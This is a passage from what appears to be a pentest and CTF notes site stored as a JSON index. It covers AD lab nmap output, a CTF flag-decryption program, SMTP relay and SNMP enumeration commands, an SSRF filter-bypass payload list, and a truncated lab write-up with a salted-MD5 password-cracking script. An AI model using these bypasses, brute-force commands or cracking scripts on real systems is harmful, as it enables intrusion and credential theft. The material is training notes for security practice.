class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: sendai.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-02T22:58:32+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e -1s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-01T22:52:14\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-31T22:52:14\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: SENDAI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: SENDAI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: DC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: dc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Tree_Name: sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-08-02T22:57:52+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-08-02T22:57:56\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eEnum Username :\u003c/p\u003e","tags":[],"title":"Sendai"},{"content":" First Identify how works the encryption : content[i] = rand1 ^ content[i]; content[i] = ((unsigned char)content[i] \u0026lt;\u0026lt; rand2) | ((unsigned char)content[i] \u0026gt;\u0026gt; (8 - rand2));\rAnother interesting part the rand seed is write in the fourth bytes : local_18 = fopen(\u0026#34;flag.enc\u0026#34;,\u0026#34;wb\u0026#34;); fwrite(\u0026amp;local_40,1,4,local_18);\rSo we can use the same rand when the flag was encrypted : fseek(file, 0, SEEK_END);// Set a pointer a the end of the file local_28 = ftell(file);// Grab the file size thanks to the pointer fseek(file, 0, SEEK_SET);//Set back the pointer to his initial place local_20 = malloc(local_28); fread(local_20, 1, local_28, file); memcpy(\u0026amp;seed, local_20, 4);//Copy the firs four bytes And Now the full code to decode the flag :\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void decrypt(int time, char *content, int content_length) { srand(time); for (int i = 4; i \u0026lt; content_length; i++) { int rand1 = rand(); int rand2 = rand() \u0026amp; 7; content[i] = ((unsigned char)content[i] \u0026gt;\u0026gt; rand2) | ((unsigned char)content[i] \u0026lt;\u0026lt; (8 - rand2)); content[i] = rand1 ^ content[i]; } for (int i = 4; i \u0026lt; content_length; i++) { printf(\u0026#34;%c\u0026#34;,content[i]); } } int main() { FILE *file; void *local_20; long int local_28; int seed; file = fopen(\u0026#34;flag.enc\u0026#34;, \u0026#34;rb\u0026#34;); fseek(file, 0, SEEK_END); local_28 = ftell(file); fseek(file, 0, SEEK_SET); local_20 = malloc(local_28); fread(local_20, 1, local_28, file); memcpy(\u0026amp;seed, local_20, 4); printf(\u0026#34;Seed: %d\\n\u0026#34;, seed); printf(\u0026#34;--------------------------------\\n\u0026#34;); decrypt(seed, (char *)local_20, local_28); fclose(file); free(local_20); return 0; }\r","date":"2023-09-07","id":101,"permalink":"/notes/pwn-reverse/chall/simple-encryptor/","summary":"\u003cul\u003e\n\u003cli\u003eFirst Identify how works the encryption :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003econtent\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erand1\u003c/span\u003e \u003cspan class=\"o\"\u003e^\u003c/span\u003e \u003cspan class=\"n\"\u003econtent\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003econtent\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003econtent\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003erand2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003econtent\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003erand2\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eAnother interesting part the rand seed is write in the fourth bytes :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"n\"\u003elocal_18\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003efopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;flag.enc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;wb\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nf\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003elocal_40\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003elocal_18\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eSo we can use the same rand when the flag was encrypted :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003efseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_END\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"c1\"\u003e// Set a pointer a the end of the file \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003elocal_28\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eftell\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"c1\"\u003e// Grab the file size thanks to the pointer\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nf\"\u003efseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_SET\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"c1\"\u003e//Set back the pointer to his initial place\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003elocal_20\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003emalloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elocal_28\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elocal_20\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003elocal_28\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ememcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eseed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003elocal_20\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"c1\"\u003e//Copy the firs four bytes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eAnd Now the full code to decode the flag :\u003c/p\u003e","tags":[],"title":"Simple Encryptor"},{"content":" Open relay : nmap \u0026lt;IP\u0026gt; -p25 --script smtp-open-relay -v\rtry to send mail : swaks --from \u0026#39;\u0026lt;EMAIL\u0026gt;\u0026#39; --to \u0026#39;\u0026lt;EMAIL\u0026gt;\u0026#39; --server \u0026lt;IP\u0026gt; --header \u0026#34;Subject: Test d\u0026#39;intrusion AlgoSecure\u0026#34; --body \u0026#34;Bonjour, ceci est un message d\u0026#39;AlgoSecure. Si vous recevez cet email, votre serveur de messagerie est mal configuré. Pourriez-vous nous transmettre une copie de cet email lorsque vous le recevrez ? Merci d\u0026#39;avance. Cordialement.\u0026#34;\r","date":"2023-09-07","id":102,"permalink":"/notes/services/smtp/","summary":"\u003cul\u003e\n\u003cli\u003eOpen relay :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap \u0026lt;IP\u0026gt; -p25 --script smtp-open-relay -v\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003etry to send mail :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eswaks --from \u003cspan class=\"s1\"\u003e\u0026#39;\u0026lt;EMAIL\u0026gt;\u0026#39;\u003c/span\u003e --to \u003cspan class=\"s1\"\u003e\u0026#39;\u0026lt;EMAIL\u0026gt;\u0026#39;\u003c/span\u003e --server \u0026lt;IP\u0026gt; --header \u003cspan class=\"s2\"\u003e\u0026#34;Subject: Test d\u0026#39;intrusion AlgoSecure\u0026#34;\u003c/span\u003e --body \u003cspan class=\"s2\"\u003e\u0026#34;Bonjour, ceci est un message d\u0026#39;AlgoSecure. Si vous recevez cet email, votre serveur de messagerie est mal configuré. Pourriez-vous nous transmettre une copie de cet email lorsque vous le recevrez ? Merci d\u0026#39;avance. Cordialement.\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"SMTP"},{"content":" Be patient it take time to scan your target with UDP Enumeration with nmap :\nsudo nmap -sU --script \u0026#34;snmp* and not snmp-brute\u0026#34; -T5 10.10.11.248\rIt checks if your are able to write and at the same that enumerate snmp:\nsnmp-check -p 161 -c \u0026lt;community-string\u0026gt; -w \u0026lt;ip\u0026gt; -d\rBy default community string is public and the default is port 161.\nEnumerate smnp:\nsnmpwalk -v \u0026lt;version\u0026gt; -c public \u0026lt;ip\u0026gt;\rBrute force snmp string community :\nonesixtyone -c dict.txt 10.129.42.254\rEnumerate User :\nsnmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25\rQuery all the software\nsnmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2\rTcp listening port :\nsnmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3\r","date":"2023-09-07","id":103,"permalink":"/notes/services/snmp/","summary":"\u003cul\u003e\n\u003cli\u003eBe patient it take time to scan your target with UDP\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEnumeration with nmap :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap -sU --script \u003cspan class=\"s2\"\u003e\u0026#34;snmp* and not snmp-brute\u0026#34;\u003c/span\u003e -T5 10.10.11.248\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eIt checks if your are able to write and at the same that enumerate snmp:\u003c/p\u003e","tags":[],"title":"SNMP"},{"content":"SSRF with blacklist-based input filter\nBypass with double encoding : https://owasp.org/www-community/Double_Encoding\nBYpass with url structure : 127.0.0.1 \u0026ndash;\u0026gt; 127.1 https://highon.coffee/blog/ssrf-cheat-sheet/\nLocalhost bypass:\nAll IPv4: 0 All IPv6: :: All IPv4: 0.0.0.0 Localhost IPv6: ::1 All IPv4: 0000 All IPv4: (Leading zeros): 00000000 IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001 8-Bit Octal conversion: 0177.00.00.01 32-Bit Octal conversion: 017700000001 32-Bit Hex conversion: 0x7f000001\rVarious bypasses:\n127.0.0.1:80 127.0.0.1:443 127.0.0.1:22 127.1:80 0 0.0.0.0:80 localhost:80 [::]:80/ [::]:25/ SMTP [::]:3128/ Squid [0000::1]:80/ [0:0:0:0:0:ffff:127.0.0.1]/thefile ①②⑦.⓪.⓪.⓪ 127.127.127.127 127.0.1.3 127.0.0.0 2130706433/ 017700000001 3232235521/ 3232235777/ 0x7f000001/ 0xc0a80014/ {domain}@127.0.0.1 127.0.0.1#{domain} {domain}.127.0.0.1 127.0.0.1/{domain} 127.0.0.1/?d={domain} {domain}@127.0.0.1 127.0.0.1#{domain} {domain}.127.0.0.1 127.0.0.1/{domain} 127.0.0.1/?d={domain} {domain}@localhost localhost#{domain} {domain}.localhost localhost/{domain} localhost/?d={domain} 127.0.0.1%00{domain} 127.0.0.1?{domain} 127.0.0.1///{domain} 127.0.0.1%00{domain} 127.0.0.1?{domain} 127.0.0.1///{domain}st:+11211aaa st:00011211aaaa 0/ 127.1 127.0.1 1.1.1.1 \u0026amp;@2.2.2.2# @3.3.3.3/ 127.1.1.1:80\\@127.2.2.2:80/ 127.1.1.1:80\\@@127.2.2.2:80/ 127.1.1.1:80:\\@@127.2.2.2:80/ 127.1.1.1:80#\\@127.2.2.2:80/\rLook for Domain that resolve 127.0.0.1\nSSRF with whitelist-based input filters\nThe URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:\nYou can embed credentials in a URL before the hostname, using the @ character. For example:\nhttps://expected-host:fakepassword@evil-host\nYou can use the # character to indicate a URL fragment. For example:\nhttps://evil-host#expected-host\nYou can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:\nhttps://expected-host.evil-host\nYou can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.\nYou can use combinations of these techniques together.\nExample :\nVisit a product, click \u0026ldquo;Check stock\u0026rdquo;, intercept the request in Burp Suite, and send it to Burp Repeater.\nChange the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.\nChange the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.\nAppend a # to the username and observe that the URL is now rejected.\nDouble-URL encode the # to %2523 and observe the extremely suspicious \u0026ldquo;Internal Server Error\u0026rdquo; response, indicating that the server may have attempted to connect to \u0026ldquo;username\u0026rdquo;.\nTo access the admin interface and delete the target user, change the URL to:\nhttp://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos\nYou can also proc a ssrf with an Open redirect . Check this link for a little reminder : https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection Resource : https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient\nURL validation bypass cheat sheet :\nhttps://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet\n","date":"2023-09-07","id":104,"permalink":"/notes/web/ssrf/","summary":"\u003cp\u003e\u003cstrong\u003eSSRF with blacklist-based input filter\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eBypass with double encoding \u003c/code\u003e: https://owasp.org/www-community/Double_Encoding\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eBYpass with url structure\u003c/code\u003e : 127.0.0.1 \u0026ndash;\u0026gt; 127.1  https://highon.coffee/blog/ssrf-cheat-sheet/\u003c/p\u003e","tags":[],"title":"SSRF"},{"content":"Scan :\n21/tcp open ftp vsftpd 3.0.5 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 516254e8c91bab8266a85b6b83fa3294 (ECDSA) |_ 256 8a2c9a78812ba19a10bb00bfeecbf832 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: Login |_http-server-header: Apache/2.4.52 (Ubuntu) 873/tcp open rsync (protocol version 31) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rrsync -av rsync://$target:873/httpd ./\r1|admin|7658a2741c9df3a97c819584db6e6b3c 2|triss|a0de4d7f81676c3ea9eabcadfd2536f6\rEasy Brute force : import hashlib # Function to compute the MD5 hash of a given string def compute_md5_hash(input_string): return hashlib.md5(input_string.encode()).hexdigest() # Given parameters secure_string = \u0026#39;6c4972f3717a5e881e282ad3105de01e\u0026#39; # Replace with actual secure string username = \u0026#39;triss\u0026#39; # Replace with actual username target_hash = \u0026#39;a0de4d7f81676c3ea9eabcadfd2536f6\u0026#39; # Open and read the file containing potential passwords with open(\u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;, \u0026#39;r\u0026#39;) as file: for line in file: # Remove any leading/trailing whitespace characters like newlines password = line.strip() # Create the string to be hashed string_to_hash = f\u0026#39;{secure_string}|{username}|{password}\u0026#39; # Compute the hash of the string hashed_string = compute_md5_hash(string_to_hash) # Compare with the 